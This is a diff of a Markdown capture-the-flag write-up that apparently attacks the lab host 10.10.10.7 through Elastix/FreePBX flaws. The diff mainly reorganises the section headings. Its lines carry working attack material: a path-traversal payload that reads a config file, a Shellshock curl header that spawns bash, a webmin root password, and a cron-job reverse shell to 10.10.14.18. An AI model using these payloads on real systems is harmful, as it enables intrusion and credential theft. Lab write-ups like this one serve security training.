@@ -126,8 +126,11 @@ Finished
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a9470a5b-52e2-4d9b-a204-b7bc268f5ce8)
 
 
-## Exploitation
-### 1.Solution:
+
+## Method 1:
+
+### Gainin Access
+
 + **FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution:** [CVE-2012-4869](https://www.exploit-db.com/exploits/18650)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bad4b1fb-ec37-4d3a-909a-793444ff8642)
@@ -145,6 +148,9 @@ Finished
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5d0fc2c7-ae04-445e-8dd4-ff126f3ddf70)
 
+
+### Privilege Escalation
+
 + Check the exploit: [CVE-2012-4869](https://www.exploit-db.com/exploits/18650)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d3c1ce37-ee67-4969-ac1b-e1317cc62c3b)
@@ -156,7 +162,10 @@ Finished
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7ba531b7-f20d-4a5d-9968-6ccfdecbb510)
 
 
-### 2.Solution:
+## Method 2:
+
+### Privilege Escalation
+
 + **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
 + Exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
 + Navigate to:
@@ -193,7 +202,11 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
-### 3.Solution:
+
+## Method 3:
+
+### Privilege Escalation
+
 + Navigate to `https://10.10.10.7:10000/` and try login: `admin`:`admin`
 + Failed attempt redirects `https://10.10.10.7:10000/session_login.cgi`
 
@@ -211,7 +224,10 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
 
 
-### 4.Solution:
+## Method 4:
+
+### Privilege Escalation
+
 + Navigate to `https://10.10.10.7:10000/` and login webmin: `root`:`jEhdIekWmdjE`
 + Go to `System`->`Scheduled Cron Jobs`->`Create a new scheduled cron job.`
 + `bash -c 'bash -i >& /dev/tcp/10.10.14.18/5555 0>&1'`
